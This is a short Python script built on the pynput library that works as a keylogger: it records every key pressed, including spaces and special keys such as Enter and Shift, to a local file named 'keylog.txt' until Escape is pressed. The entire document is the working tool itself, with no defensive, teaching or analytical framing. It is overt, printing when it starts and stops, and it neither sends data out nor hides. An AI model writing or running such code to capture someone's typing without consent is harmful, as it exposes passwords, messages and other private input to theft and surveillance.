from pynput import keyboard

# Specify the file to save the keystrokes
log_file = "keylog.txt"

# Function to write keystrokes to the file
def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)  # Write the key character
            elif key == keyboard.Key.space:
                f.write(' ')  # Log spaces
            else:
                f.write(f'[{key.name}]')  # Log special keys (e.g., Enter, Shift)
    except Exception as e:
        print(f"Error: {e}")

# Function to handle key release
def on_release(key):
    if key == keyboard.Key.esc:  # Exit the logger when 'Escape' is pressed
        print("Keylogger stopped.")
        return False

# Start listening for keypresses
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press 'Escape' to stop.")
    listener.join()
